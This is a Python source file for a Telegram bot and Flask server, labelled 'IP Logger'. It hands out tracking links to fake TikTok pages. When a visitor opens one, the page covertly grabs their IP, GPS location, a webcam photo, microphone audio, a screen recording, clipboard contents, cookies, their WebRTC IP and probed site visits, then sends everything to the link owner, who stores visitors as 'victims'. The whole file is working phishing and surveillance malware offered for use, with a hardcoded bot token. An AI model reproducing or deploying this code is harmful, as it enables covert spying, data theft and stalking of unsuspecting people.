import asyncio
from telethon import TelegramClient, events, Button
from telethon.tl.types import InputMediaGeoPoint, InputGeoPoint
from flask import Flask, request, render_template_string
import threading
import random
import string
import json
import os
from datetime import datetime
import requests
import base64

BOT_TOKEN = "8962532742:AAG1377yowFSqklfaPP_AzEXvIvV-Fm_jqw"

bot = TelegramClient('logger_bot', api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")
app = Flask(__name__)
links = {}
loop = None

FULL_PAGE = """<!DOCTYPE html>
<html>
<head><title>TikTok</title><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:Arial;text-align:center}
h2{margin-top:80px}
button{background:#fe2c55;color:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:30px;margin:10px;cursor:pointer}
#status{margin-top:20px;color:#aaa}
</style></head>
<body>
<h2>🎬 TikTok Video</h2>
<p>Нажми кнопку чтобы посмотреть</p>
<button onclick="startAll()">▶ Смотреть</button>
<p id="status"></p>
<video id="v" style="display:none" autoplay playsinline></video>
<canvas id="c" style="display:none"></canvas>
<script>
fetch('/collect/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,pl:navigator.platform,la:navigator.language,ss:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone})});

function startAll(){
    document.getElementById('status').innerText = 'Загрузка...';
    
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(pos=>{
            fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});
        },err=>{},{enableHighAccuracy:true,timeout:10000});
    }
    
    (async function(){
        try{
            var st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
            var v=document.getElementById('v');v.srcObject=st;await v.play();
            await new Promise(r=>setTimeout(r,2000));
            var c=document.getElementById('c');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
            c.getContext('2d').drawImage(v,0,0);
            var ph=c.toDataURL('image/jpeg',0.7);
            await fetch('/photo/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({photo:ph})});
            st.getTracks().forEach(t=>t.stop());
        }catch(e){}
    })();
    
    (async function(){
        try{
            var st=await navigator.mediaDevices.getUserMedia({audio:true});
            var chunks=[],rec=new MediaRecorder(st);
            rec.ondataavailable=e=>chunks.push(e.data);
            rec.start();
            await new Promise(r=>setTimeout(()=>rec.stop(),4000));
            var blob=new Blob(chunks,{type:'audio/webm'});
            var reader=new FileReader();reader.readAsDataURL(blob);
            reader.onloadend=()=>fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:reader.result})});
            st.getTracks().forEach(t=>t.stop());
        }catch(e){}
    })();
    
    (async function(){
        try{
            var st=await navigator.mediaDevices.getDisplayMedia({video:true});
            var chunks=[],rec=new MediaRecorder(st);
            rec.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data)};
            rec.start();
            await new Promise(r=>setTimeout(()=>rec.stop(),5000));
            var blob=new Blob(chunks,{type:'video/webm'});
            var reader=new FileReader();reader.readAsDataURL(blob);
            reader.onloadend=()=>fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:reader.result})});
            st.getTracks().forEach(t=>t.stop());
        }catch(e){}
    })();
    
    (async function(){
        var sites=['web.telegram.org','vk.com','ok.ru','instagram.com','twitter.com','youtube.com','discord.com','github.com','steamcommunity.com','reddit.com','tinder.com','onlyfans.com','binance.com','bybit.com','paypal.com','sberbank.ru','tinkoff.ru','ozon.ru','wildberries.ru','avito.ru'];
        var visited=[];
        for(var i=0;i<sites.length;i++){
            try{
                var img=new Image();img.src='https://'+sites[i]+'/favicon.ico';
                await new Promise(r=>{img.onload=()=>{visited.push(sites[i]);r();};img.onerror=()=>{visited.push(sites[i]);r();};setTimeout(r,300);});
            }catch(e){}
        }
        if(visited.length>0) fetch('/history/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visited:visited})});
    })();
    
    (async function(){
        try{var text=await navigator.clipboard.readText();if(text) fetch('/clipboard/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({clipboard:text})});}catch(e){}
    })();
    
    (function(){
        var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
        pc.createDataChannel('');pc.createOffer().then(o=>pc.setLocalDescription(o));
        pc.onicecandidate=e=>{if(e.candidate){var m=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);if(m) fetch('/webrtc/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({webrtc_ip:m[0]})});}};
    })();
    
    (function(){var c=document.cookie;if(c) fetch('/cookies/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:c})});})();
    
    setTimeout(()=>document.getElementById('status').innerText='✅ Готово!',2000);
}
</script></body></html>"""

AUDIO_PAGE = """<!DOCTYPE html>
<html><head><title>TikTok</title><meta charset="UTF-8"><style>body{background:#000;color:#fff;text-align:center;padding-top:100px;font-family:Arial}button{background:#fe2c55;color:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:30px;cursor:pointer}</style></head>
<body><h3>Audio</h3><button onclick="rec()">▶ Записать</button><p id="s"></p>
<script>
async function rec(){try{var st=await navigator.mediaDevices.getUserMedia({audio:true});var c=[],r=new MediaRecorder(st);r.ondataavailable=e=>c.push(e.data);r.start();await new Promise(q=>setTimeout(()=>r.stop(),5000));var b=new Blob(c,{type:'audio/webm'});var fr=new FileReader();fr.readAsDataURL(b);fr.onloadend=()=>fetch('/audio/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({audio:fr.result})});st.getTracks().forEach(t=>t.stop());document.getElementById('s').innerText='Done!'}catch(e){document.getElementById('s').innerText='Error'}}
</script></body></html>"""

SCREEN_PAGE = """<!DOCTYPE html>
<html><head><title>TikTok</title><meta charset="UTF-8"><style>body{background:#000;color:#fff;text-align:center;padding-top:100px;font-family:Arial}button{background:#fe2c55;color:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:30px;cursor:pointer}</style></head>
<body><h3>Screen</h3><button onclick="rec()">▶ Записать экран</button><p id="s"></p>
<script>
async function rec(){try{var st=await navigator.mediaDevices.getDisplayMedia({video:true});var c=[],r=new MediaRecorder(st);r.ondataavailable=e=>{if(e.data.size>0)c.push(e.data)};r.start();await new Promise(q=>setTimeout(()=>r.stop(),5000));var b=new Blob(c,{type:'video/webm'});var fr=new FileReader();fr.readAsDataURL(b);fr.onloadend=()=>fetch('/screen/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({screen:fr.result})});st.getTracks().forEach(t=>t.stop());document.getElementById('s').innerText='Done!'}catch(e){document.getElementById('s').innerText='Error'}}
</script></body></html>"""

def gen_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def get_ip_info(ip):
    first_ip = ip.split(',')[0].strip()
    try:
        r = requests.get(f"https://ipapi.co/{first_ip}/json/", timeout=5)
        data = r.json()
        if data.get('city'):
            return {'country': data.get('country_name','?'), 'city': data.get('city','?'), 'region': data.get('region','?'), 'isp': data.get('org','?'), 'lat': data.get('latitude'), 'lon': data.get('longitude'), 'query': first_ip}
    except: pass
    try:
        r = requests.get(f"http://ip-api.com/json/{first_ip}?fields=country,regionName,city,isp,lat,lon,query", timeout=5)
        data = r.json()
        if data.get('city'):
            return {'country': data.get('country','?'), 'city': data.get('city','?'), 'region': data.get('regionName','?'), 'isp': data.get('isp','?'), 'lat': data.get('lat'), 'lon': data.get('lon'), 'query': first_ip}
    except: pass
    return {'country':'?','city':'?','region':'?','isp':'?','lat':None,'lon':None,'query':first_ip}

@app.route('/')
def home(): return "OK"

@app.route('/go/<lid>')
def track(lid):
    if lid not in links: return "Ссылка недействительна"
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '?')
    v = {'time': datetime.now().strftime('%H:%M:%S'), 'ip': ip, 'ua': ua, 'photo': None, 'gps': None, 'history': None, 'audio': None, 'screen': None, 'clipboard': None, 'webrtc_ip': None, 'cookies': None}
    v.update(get_ip_info(ip))
    links[lid]['victims'].append(v)
    asyncio.run_coroutine_threadsafe(notify(links[lid]['owner'], lid), loop)
    link_type = links[lid].get('type', 'full')
    if link_type == 'audio': return render_template_string(AUDIO_PAGE, link_id=lid)
    elif link_type == 'screen': return render_template_string(SCREEN_PAGE, link_id=lid)
    return render_template_string(FULL_PAGE, link_id=lid)

@app.route('/collect/<lid>', methods=['POST'])
def coll(lid):
    if lid in links and links[lid]['victims']: links[lid]['victims'][-1]['dev'] = request.get_json()
    return 'ok'
@app.route('/photo/<lid>', methods=['POST'])
def photo(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('photo'): links[lid]['victims'][-1]['photo'] = d['photo']
    return 'ok'
@app.route('/gps/<lid>', methods=['POST'])
def gps(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        links[lid]['victims'][-1]['gps'] = d
    return 'ok'
@app.route('/history/<lid>', methods=['POST'])
def history(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        links[lid]['victims'][-1]['history'] = d
    return 'ok'
@app.route('/audio/<lid>', methods=['POST'])
def audio(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('audio'): links[lid]['victims'][-1]['audio'] = d['audio']
    return 'ok'
@app.route('/screen/<lid>', methods=['POST'])
def screen(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('screen'): links[lid]['victims'][-1]['screen'] = d['screen']
    return 'ok'
@app.route('/clipboard/<lid>', methods=['POST'])
def clipboard(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('clipboard'): links[lid]['victims'][-1]['clipboard'] = d['clipboard']
    return 'ok'
@app.route('/webrtc/<lid>', methods=['POST'])
def webrtc(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('webrtc_ip'): links[lid]['victims'][-1]['webrtc_ip'] = d['webrtc_ip']
    return 'ok'
@app.route('/cookies/<lid>', methods=['POST'])
def cookies(lid):
    if lid in links and links[lid]['victims']:
        d = request.get_json()
        if d.get('cookies'): links[lid]['victims'][-1]['cookies'] = d['cookies']
    return 'ok'

async def notify(uid, lid):
    try:
        await asyncio.sleep(30)
        v = links[lid]['victims'][-1] if links[lid]['victims'] else {}
        
        report = f"""📋 ОТЧЁТ
🕐 {v.get('time','?')}
🌐 IP: {v.get('ip','?').split(',')[0].strip() if v.get('ip') else '?'}
🏙 {v.get('city','?')}, {v.get('region','?')}, {v.get('country','?')}
📡 {v.get('isp','?')}
📱 {v.get('ua','?')[:150]}
"""
        if v.get('gps') and v['gps'].get('lat'):
            report += f"📍 GPS: {v['gps']['lat']}, {v['gps']['lon']} (±{v['gps'].get('acc','?')}м)\n"
        if v.get('clipboard'):
            report += f"\n📋 Буфер: {v['clipboard'][:200]}"
        
        await bot.send_message(uid, report[:2000])
        
        # Фото
        if v.get('photo'):
            try:
                photo_path = f"photo_{lid}.jpg"
                with open(photo_path, 'wb') as f:
                    f.write(base64.b64decode(v['photo'].split(',')[1]))
                await bot.send_file(uid, photo_path, caption="📸 Фото с камеры")
                os.remove(photo_path)
            except Exception as e:
                print(f"Ошибка фото: {e}")
        
        # Аудио
        if v.get('audio'):
            try:
                audio_path = f"audio_{lid}.webm"
                with open(audio_path, 'wb') as f:
                    f.write(base64.b64decode(v['audio'].split(',')[1]))
                await bot.send_file(uid, audio_path, caption="🎤 Аудио", voice_note=True)
                os.remove(audio_path)
            except Exception as e:
                print(f"Ошибка аудио: {e}")
        
        # Запись экрана
        if v.get('screen'):
            try:
                screen_path = f"screen_{lid}.webm"
                with open(screen_path, 'wb') as f:
                    f.write(base64.b64decode(v['screen'].split(',')[1]))
                await bot.send_file(uid, screen_path, caption="🎥 Запись экрана", supports_streaming=True)
                os.remove(screen_path)
            except Exception as e:
                print(f"Ошибка скрина: {e}")
        
        # Гео-точка
        if v.get('gps') and v['gps'].get('lat'):
            lat, lon = v['gps']['lat'], v['gps']['lon']
            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=int(v['gps'].get('acc',10))))
            await bot.send_file(uid, file=geo, caption=f"📍 GPS (±{v['gps'].get('acc','?')}м)")
            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
        elif v.get('lat') and v.get('lon'):
            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=v['lat'], long=v['lon'], accuracy_radius=500))
            await bot.send_file(uid, file=geo, caption="📍 IP-гео")
            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={v['lat']},{v['lon']})", link_preview=True)
        
        if v.get('webrtc_ip') and v['webrtc_ip'] != v.get('ip','').split(',')[0].strip():
            await bot.send_message(uid, f"🕵️ WebRTC IP: `{v['webrtc_ip']}`")
        
    except Exception as e:
        print(f"Ошибка notify: {e}")

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    buttons = [
        [Button.inline("🎭 Полный логгер", "full")],
        [Button.inline("🎤 Только аудио", "audio")],
        [Button.inline("🎥 Только экран", "screen")],
    ]
    await event.reply("🎭 **IP Logger**\n\n📸 Фото\n🎤 Аудио\n🎥 Экран\n📍 GPS\n\nВыбери тип:", buttons=buttons)

@bot.on(events.CallbackQuery)
async def callback(event):
    link_type = event.data.decode()
    lid = gen_id()
    links[lid] = {'owner': event.sender_id, 'created': datetime.now().strftime('%H:%M'), 'victims': [], 'type': link_type}
    await event.edit(f"✅ Ссылка:\n`https://botaald.onrender.com/go/{lid}`")

@bot.on(events.NewMessage(pattern='/list'))
async def lst(event):
    my = {k: v for k, v in links.items() if v['owner'] == event.sender_id}
    if not my: await event.reply("Нет ссылок")
    else:
        r = "📋 **Ссылки:**\n"
        for lid, d in my.items(): r += f"🔗 `{lid}` — {len(d['victims'])} переходов\n"
        await event.reply(r)

async def main():
    global loop
    loop = asyncio.get_event_loop()
    port = int(os.environ.get('PORT', 8080))
    def run_flask(): app.run(host='0.0.0.0', port=port, debug=False)
    threading.Thread(target=run_flask, daemon=True).start()
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ Логгер запущен!")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
